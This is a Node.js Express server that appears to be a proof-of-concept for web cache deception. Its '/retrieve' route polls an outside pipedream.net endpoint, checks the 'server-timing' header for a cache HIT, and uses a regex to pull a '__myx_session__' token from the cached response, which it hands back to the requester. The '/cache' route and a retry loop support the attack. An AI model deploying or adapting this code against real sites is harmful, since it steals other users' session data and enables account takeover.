var express = require('express');
var path = require('path');
var app = express();
app.use(express.static('public'));
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const PORT = process.env.PORT || 5000;
var crypto = require("crypto");
var axios = require('axios');

var id = crypto.randomBytes(20).toString('hex');

app.get('/',(req,res)=>{
    res.sendFile(path.join(__dirname + '/files/main.html'))
})
app.get('/cache',(req,res)=>{
    var retries = req.query.retries
    if(req.query.key){
        res.sendFile(path.join(__dirname + '/files/cache.html'))
    }else{
        var key = crypto.randomBytes(10).toString('hex');
        res.redirect(`/cache?key=${key}` + ((retries ? retries:'') && `&retries=${retries}`))
    }
})
app.get('/retrieve',(req,res)=>{
    var key=req.query.key
    if(!key){
        res.redirect('/')
        return
    }

    // const headers = {
    //     'Connection': 'close',
    //     'User-Agent': req.headers['user-agent'],
    //     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    //     'Accept-Encoding': 'gzip, deflate',
    //     'Accept-Language': 'en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7',
    // }
    axios
        .get(`https://de95be0fea559f49c305bf405fc7189b.m.pipedream.net`, {validateStatus: false})
        .then(response => {
            cache_status = response.headers['server-timing'].split(';')[1].split(',')[0].trim()
            if (cache_status == 'desc=HIT'){
                var regex = /\[\"__myx_session__\"\].*/g
                 result = regex.exec(response.data)
                if (result){
                    console.log(result[0])
                    res.send(result)
                }else{
                    res.send(response.data)
                }
            } else {
                var retries = req.query.retries ? req.query.retries:0
                if (retries<3)
                    res.redirect(`/cache?retries=${Number(retries)+1}`)
                else{
                    res.send("<div style='text-align:center'><p>Faield to retrieve user data</p> <a href='/'>Go Home</a></div>")
                }
            }
        
        })
        .catch(error => {
            res.send("<div style='text-align:center'><p>Something went wrong</p> <a href='/'>Go Home</a></div>")
            console.error(error)
        })

})
app.listen(PORT, function () {
    console.log('Server started')
})